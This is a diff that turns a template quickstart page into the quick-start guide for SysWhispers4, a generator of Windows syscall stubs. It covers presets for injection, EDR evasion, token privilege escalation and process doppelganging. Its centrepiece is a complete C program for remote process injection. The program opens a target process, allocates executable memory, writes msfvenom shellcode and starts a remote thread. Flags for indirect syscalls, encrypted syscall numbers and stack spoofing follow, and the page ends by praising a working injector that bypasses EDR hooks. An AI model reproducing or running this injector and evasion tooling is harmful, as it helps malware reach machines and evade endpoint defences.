@@ -1,80 +1,548 @@
 ---
-title: "Quickstart"
-description: "Start building awesome documentation in minutes"
+title: Quick Start
+description: Generate your first syscall stubs and integrate them into a C project in minutes
 ---
 
-## Get started in three steps
+## Your First Syscall Stub
 
-Get your documentation site running locally and make your first customization.
-
-### Step 1: Set up your local environment
-
-<AccordionGroup>
-  <Accordion icon="copy" title="Clone your docs locally">
-    During the onboarding process, you created a GitHub repository with your docs content if you didn't already have one. You can find a link to this repository in your [dashboard](https://dashboard.mintlify.com).
-    
-    To clone the repository locally so that you can make and preview changes to your docs, follow the [Cloning a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) guide in the GitHub docs.
-  </Accordion>
-  <Accordion icon="rectangle-terminal" title="Start the preview server">
-    1. Install the Mintlify CLI: `npm i -g mint`
-    2. Navigate to your docs directory and run: `mint dev`
-    3. Open `http://localhost:3000` to see your docs live!
-    
-    <Tip>Your preview updates automatically as you edit files.</Tip>
-  </Accordion>
-</AccordionGroup>
-
-### Step 2: Deploy your changes
-
-<AccordionGroup>
-  <Accordion icon="github" title="Install our GitHub app">
-    Install the Mintlify GitHub app from your [dashboard](https://dashboard.mintlify.com/settings/organization/github-app).
-    
-    Our GitHub app automatically deploys your changes to your docs site, so you don't need to manage deployments yourself.
-</Accordion>
-<Accordion icon="palette" title="Update your site name and colors">
-    For a first change, let's update the name and colors of your docs site.
-
-    1. Open `docs.json` in your editor.
-    2. Change the `"name"` field to your project name.
-    3. Update the `"colors"` to match your brand.
-    4. Save and see your changes instantly at `http://localhost:3000`.
-
-    <Tip>Try changing the primary color to see an immediate difference!</Tip>
-  </Accordion>
-</AccordionGroup>
-
-### Step 3: Go live
-
-<Accordion icon="rocket" title="Publish your docs">
-  1. Commit and push your changes.
-  2. Your docs will update and be live in moments!
-</Accordion>
-
-## Next steps
-
-Now that you have your docs running, explore these key features:
-
-<CardGroup cols={2}>
-
-<Card title="Write Content" icon="pen-to-square" href="/essentials/markdown">
-  Learn MDX syntax and start writing your documentation.
-</Card>
-
-<Card title="Customize style" icon="palette" href="/essentials/settings">
-  Make your docs match your brand perfectly.
-</Card>
-
-<Card title="Add code examples" icon="square-code" href="/essentials/code">
-  Include syntax-highlighted code blocks.
-</Card>
-
-<Card title="API documentation" icon="code" href="/api-reference/introduction">
-  Auto-generate API docs from OpenAPI specs.
-</Card>
-
-</CardGroup>
+This guide walks you through generating syscall stubs for common NT functions and integrating them into a working C program.
 
 <Note>
-  **Need help?** See our [full documentation](https://mintlify.com/docs) or join our [community](https://mintlify.com/community).
+Make sure you've completed the [Installation](/installation) steps before proceeding.
 </Note>
+
+## Generate Syscall Stubs
+
+<Steps>
+  <Step title="Choose a Preset">
+    SysWhispers4 provides 8 presets for common use cases. Let's start with the **`common`** preset:
+    
+    ```bash
+    cd SysWhispers4
+    python syswhispers.py --preset common
+    ```
+    
+    This generates stubs for 25 essential functions including:
+    - `NtAllocateVirtualMemory` — Memory allocation
+    - `NtCreateThreadEx` — Thread creation
+    - `NtOpenProcess` — Process handle operations
+    - `NtWriteVirtualMemory` — Memory writing
+    - And 21 more...
+    
+    <Accordion title="View all available presets">
+      ```bash
+      python syswhispers.py --list-presets
+      ```
+      
+      | Preset | Description | Functions |
+      |--------|-------------|----------|
+      | `common` | General process/thread/memory operations | 25 |
+      | `injection` | Process/shellcode injection via APC, threads, sections | 20 |
+      | `evasion` | AV/EDR evasion queries and operations | 15 |
+      | `token` | Token manipulation and privilege escalation | 6 |
+      | `stealth` | Maximum evasion: injection + evasion + unhooking | 31 |
+      | `file_ops` | File I/O via NT syscalls | 7 |
+      | `transaction` | Process doppelganging / transaction rollback | 7 |
+      | `all` | Every supported function | 64 |
+    </Accordion>
+  </Step>
+  
+  <Step title="Review Generated Files">
+    SysWhispers4 creates 4 files in the current directory:
+    
+    ```bash
+    ls -l SW4Syscalls*
+    ```
+    
+    Output:
+    ```
+    SW4Syscalls.asm         # MASM syscall stubs (x64 assembly)
+    SW4Syscalls.c           # Runtime SSN resolution + helper functions
+    SW4Syscalls.h           # Function prototypes + API declarations
+    SW4Syscalls_Types.h     # NT type definitions (structures, enums)
+    ```
+    
+    <Accordion title="What's in each file?">
+      <CodeGroup>
+      ```c SW4Syscalls_Types.h
+      // NT data structures and type definitions
+      typedef struct _UNICODE_STRING {
+          USHORT Length;
+          USHORT MaximumLength;
+          PWSTR  Buffer;
+      } UNICODE_STRING, *PUNICODE_STRING;
+      
+      typedef struct _OBJECT_ATTRIBUTES {
+          ULONG Length;
+          HANDLE RootDirectory;
+          PUNICODE_STRING ObjectName;
+          // ...
+      } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+      // ... more types ...
+      ```
+      
+      ```c SW4Syscalls.h
+      // Function prototypes
+      EXTERN_C NTSTATUS NTAPI SW4_NtAllocateVirtualMemory(
+          HANDLE ProcessHandle,
+          PVOID *BaseAddress,
+          ULONG_PTR ZeroBits,
+          PSIZE_T RegionSize,
+          ULONG AllocationType,
+          ULONG Protect
+      );
+      
+      // Initialization function
+      EXTERN_C BOOL SW4_Initialize(VOID);
+      ```
+      
+      ```c SW4Syscalls.c
+      // SSN resolution implementation (FreshyCalls)
+      BOOL SW4_Initialize(VOID) {
+          // Enumerate ntdll exports
+          // Sort Nt* functions by virtual address
+          // Assign SSN = sorted index
+          // ...
+      }
+      ```
+      
+      ```asm SW4Syscalls.asm
+      ; MASM syscall stub
+      SW4_NtAllocateVirtualMemory PROC
+          mov r10, rcx                  ; Save RCX
+          mov eax, [SW4_SsnTable + 0*4] ; Load SSN
+          syscall                        ; Invoke kernel
+          ret
+      SW4_NtAllocateVirtualMemory ENDP
+      ```
+      </CodeGroup>
+    </Accordion>
+  </Step>
+  
+  <Step title="Understand the Output Summary">
+    The generator prints a summary:
+    
+    ```
+    Functions  : 25
+    Arch       : x64
+    Compiler   : msvc
+    Resolution : freshycalls
+    Method     : embedded
+    Prefix     : SW4_
+    
+    [*] Integration guide:
+        Add to MSVC project:
+          SW4Syscalls_Types.h  SW4Syscalls.h  SW4Syscalls.c  SW4Syscalls.asm
+        Enable MASM: Project -> Build Customizations -> masm (.targets)
+        Call SW4_Initialize() at startup.
+    
+    [+] Done.
+    ```
+    
+    Key information:
+    - **Resolution: freshycalls** — Sorts ntdll exports by VA (hook-resistant)
+    - **Method: embedded** — Direct `syscall` instruction in stub
+    - **Prefix: SW4_** — All functions/symbols prefixed with `SW4_`
+  </Step>
+</Steps>
+
+## Create a Test Program
+
+Let's create a simple program that allocates memory using our generated syscalls.
+
+<CodeGroup>
+```c test_syscalls.c
+#include <stdio.h>
+#include <windows.h>
+#include "SW4Syscalls.h"
+
+int main(void) {
+    printf("[*] Initializing SysWhispers4...\n");
+    
+    // Initialize: Resolve syscall numbers via FreshyCalls
+    if (!SW4_Initialize()) {
+        fprintf(stderr, "[!] SW4_Initialize failed\n");
+        return 1;
+    }
+    printf("[+] SSN resolution complete\n");
+    
+    // Allocate 4KB of memory in current process
+    PVOID baseAddress = NULL;
+    SIZE_T regionSize = 0x1000;  // 4096 bytes
+    
+    NTSTATUS status = SW4_NtAllocateVirtualMemory(
+        GetCurrentProcess(),     // ProcessHandle
+        &baseAddress,            // BaseAddress (out)
+        0,                       // ZeroBits
+        &regionSize,             // RegionSize (in/out)
+        MEM_COMMIT | MEM_RESERVE,// AllocationType
+        PAGE_READWRITE           // Protect
+    );
+    
+    if (NT_SUCCESS(status)) {
+        printf("[+] Allocated %zu bytes at address 0x%p\n", 
+               regionSize, baseAddress);
+        
+        // Write some data
+        memcpy(baseAddress, "Hello from syscall!", 19);
+        printf("[+] Wrote data: %s\n", (char*)baseAddress);
+        
+        // Free memory
+        regionSize = 0;
+        status = SW4_NtFreeVirtualMemory(
+            GetCurrentProcess(),
+            &baseAddress,
+            &regionSize,
+            MEM_RELEASE
+        );
+        
+        if (NT_SUCCESS(status)) {
+            printf("[+] Memory freed successfully\n");
+        }
+    } else {
+        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
+        return 1;
+    }
+    
+    printf("[+] All operations completed via direct syscalls!\n");
+    return 0;
+}
+```
+</CodeGroup>
+
+## Compile and Run
+
+<Tabs>
+  <Tab title="MSVC (Visual Studio)">
+    <Steps>
+      <Step title="Create Project">
+        1. Open Visual Studio
+        2. File → New → Project → "Empty Project"
+        3. Name: `SysWhispersTest`
+      </Step>
+      
+      <Step title="Enable MASM">
+        - Right-click project → Build Dependencies → Build Customizations
+        - Check **masm (.targets, .props)**
+      </Step>
+      
+      <Step title="Add Files">
+        Right-click project → Add → Existing Item:
+        - `SW4Syscalls_Types.h`
+        - `SW4Syscalls.h`
+        - `SW4Syscalls.c`
+        - `SW4Syscalls.asm`
+        - `test_syscalls.c`
+      </Step>
+      
+      <Step title="Build">
+        - Press F7 or Build → Build Solution
+        - If successful, output: `SysWhispersTest.exe`
+      </Step>
+      
+      <Step title="Run">
+        ```
+        [*] Initializing SysWhispers4...
+        [+] SSN resolution complete
+        [+] Allocated 4096 bytes at address 0x000001A2B4E30000
+        [+] Wrote data: Hello from syscall!
+        [+] Memory freed successfully
+        [+] All operations completed via direct syscalls!
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+  
+  <Tab title="MinGW / GCC">
+    <Steps>
+      <Step title="Regenerate with MinGW Compiler">
+        ```bash
+        python syswhispers.py --preset common --compiler mingw
+        ```
+        
+        This creates `SW4Syscalls_stubs.c` (GAS inline assembly) instead of `.asm`.
+      </Step>
+      
+      <Step title="Compile">
+        ```bash
+        x86_64-w64-mingw32-gcc -masm=intel \
+            test_syscalls.c \
+            SW4Syscalls.c \
+            SW4Syscalls_stubs.c \
+            -o test_syscalls.exe \
+            -lntdll
+        ```
+      </Step>
+      
+      <Step title="Run on Windows">
+        Transfer `test_syscalls.exe` to Windows machine:
+        ```
+        C:\> test_syscalls.exe
+        [*] Initializing SysWhispers4...
+        [+] SSN resolution complete
+        [+] Allocated 4096 bytes at address 0x000001A2B4E30000
+        ...
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+  
+  <Tab title="Clang">
+    <Steps>
+      <Step title="Generate with Clang">
+        ```bash
+        python syswhispers.py --preset common --compiler clang
+        ```
+      </Step>
+      
+      <Step title="Compile">
+        ```bash
+        clang -target x86_64-pc-windows-msvc -masm=intel \
+            test_syscalls.c \
+            SW4Syscalls.c \
+            SW4Syscalls_stubs.c \
+            -o test_syscalls.exe \
+            -lntdll
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+## Advanced Example: Remote Process Injection
+
+Here's a more realistic example — injecting shellcode into a remote process:
+
+<CodeGroup>
+```c inject.c
+#include <stdio.h>
+#include <windows.h>
+#include "SW4Syscalls.h"
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c
+unsigned char shellcode[] = {
+    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+    // ... (276 bytes total)
+};
+
+int main(int argc, char* argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <target_pid>\n", argv[0]);
+        return 1;
+    }
+    
+    DWORD targetPid = atoi(argv[1]);
+    
+    // Step 1: Initialize syscalls
+    if (!SW4_Initialize()) {
+        fprintf(stderr, "[!] Initialization failed\n");
+        return 1;
+    }
+    printf("[+] SysWhispers4 initialized\n");
+    
+    // Step 2: Open target process
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
+    CLIENT_ID cid = { (PVOID)(ULONG_PTR)targetPid, NULL };
+    
+    NTSTATUS status = SW4_NtOpenProcess(
+        &hProcess,
+        PROCESS_ALL_ACCESS,
+        &objAttr,
+        &cid
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtOpenProcess failed: 0x%08X\n", status);
+        return 1;
+    }
+    printf("[+] Opened PID %lu (handle 0x%p)\n", targetPid, hProcess);
+    
+    // Step 3: Allocate memory in remote process
+    PVOID remoteBase = NULL;
+    SIZE_T regionSize = sizeof(shellcode);
+    
+    status = SW4_NtAllocateVirtualMemory(
+        hProcess,
+        &remoteBase,
+        0,
+        &regionSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Allocated %zu bytes at 0x%p\n", regionSize, remoteBase);
+    
+    // Step 4: Write shellcode
+    SIZE_T written = 0;
+    status = SW4_NtWriteVirtualMemory(
+        hProcess,
+        remoteBase,
+        shellcode,
+        sizeof(shellcode),
+        &written
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", status);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Wrote %zu bytes of shellcode\n", written);
+    
+    // Step 5: Create remote thread
+    HANDLE hThread = NULL;
+    status = SW4_NtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        hProcess,
+        remoteBase,  // StartRoutine
+        NULL,        // Argument
+        0,           // CreateFlags
+        0, 0, 0, NULL
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        fprintf(stderr, "[!] NtCreateThreadEx failed: 0x%08X\n", status);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Thread created (handle 0x%p)\n", hThread);
+    
+    // Step 6: Wait for completion
+    printf("[*] Waiting for thread to complete...\n");
+    SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
+    
+    // Cleanup
+    SW4_NtClose(hThread);
+    SW4_NtClose(hProcess);
+    printf("[+] Injection complete!\n");
+    
+    return 0;
+}
+```
+</CodeGroup>
+
+<Warning>
+**For Educational Purposes Only**: This example demonstrates syscall-based process injection. Only use on systems you own or have explicit authorization to test.
+</Warning>
+
+### Generate with Advanced Options
+
+For the injection example, use enhanced evasion:
+
+```bash
+python syswhispers.py --preset injection \
+    --method indirect \
+    --resolve freshycalls \
+    --encrypt-ssn \
+    --stack-spoof
+```
+
+**What this does**:
+- `--method indirect` — Jump to ntdll gadget (RIP appears in ntdll at syscall)
+- `--resolve freshycalls` — Sort exports by VA (hook-resistant)
+- `--encrypt-ssn` — XOR-encrypt syscall numbers at rest
+- `--stack-spoof` — Synthetic call stack frames
+
+## Customizing Function Selection
+
+You can also pick individual functions:
+
+```bash
+# Generate stubs for specific functions only
+python syswhispers.py \
+    --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx
+```
+
+Or combine presets:
+
+```bash
+# Combine injection + token manipulation
+python syswhispers.py --preset injection,token
+```
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Explore SSN Resolution Methods" icon="magnifying-glass" href="/concepts/ssn-resolution">
+    Learn about FreshyCalls, Hell's Gate, Tartarus' Gate, and 5 more techniques
+  </Card>
+  <Card title="Invocation Methods" icon="bolt" href="/concepts/invocation-methods">
+    Understand embedded, indirect, randomized, and egg hunt methods
+  </Card>
+  <Card title="Evasion Features" icon="shield" href="/concepts/evasion-techniques">
+    ETW/AMSI bypass, ntdll unhooking, anti-debug, sleep encryption
+  </Card>
+  <Card title="Presets Reference" icon="list" href="/guides/presets">
+    Complete guide to all 8 function presets
+  </Card>
+</CardGroup>
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Initialization fails (SW4_Initialize returns FALSE)">
+    **Possible causes**:
+    - ntdll.dll not loaded (shouldn't happen in normal Windows process)
+    - FreshyCalls can't enumerate exports (permission issue)
+    
+    **Solutions**:
+    - Try static resolution: `--resolve static`
+    - Enable verbose mode to see debug output
+    - Check if running in unusual environment (sandboxed, driver context)
+  </Accordion>
+  
+  <Accordion title="Syscalls return STATUS_INVALID_PARAMETER (0xC000000D)">
+    **Cause**: Incorrect parameter types or invalid handles
+    
+    **Solutions**:
+    - Verify all parameters match NT function signature
+    - Check that handles are valid (not NULL or INVALID_HANDLE_VALUE)
+    - Ensure `OBJECT_ATTRIBUTES` is initialized: `{ sizeof(OBJECT_ATTRIBUTES) }`
+  </Accordion>
+  
+  <Accordion title="Access violations during syscall">
+    **Cause**: SSN mismatch (wrong syscall number for OS version)
+    
+    **Solutions**:
+    - Update syscall tables: `python scripts/update_syscall_table.py`
+    - Use dynamic resolution (FreshyCalls) instead of static
+    - Verify architecture matches (x64 vs x86)
+  </Accordion>
+  
+  <Accordion title="Compilation errors with MASM">
+    **Error**: `error A2008: syntax error`
+    
+    **Solution**: Ensure ASM file is set to "Microsoft Macro Assembler" item type in Visual Studio project properties.
+  </Accordion>
+</AccordionGroup>
+
+## What You've Learned
+
+<Steps>
+  <Step title="Generated syscall stubs">
+    Used `--preset common` to create stubs for 25 essential NT functions
+  </Step>
+  
+  <Step title="Integrated into C project">
+    Added generated files to MSVC/MinGW project and compiled successfully
+  </Step>
+  
+  <Step title="Called NT functions directly">
+    Used `SW4_NtAllocateVirtualMemory` to allocate memory via direct syscall, bypassing user-mode hooks
+  </Step>
+  
+  <Step title="Built a working injector">
+    Created a complete process injection example using syscall-based memory allocation, writing, and thread creation
+  </Step>
+</Steps>
+
+You now have a working syscall-based application that bypasses user-mode EDR hooks! Continue exploring the documentation to learn about advanced techniques and evasion features.
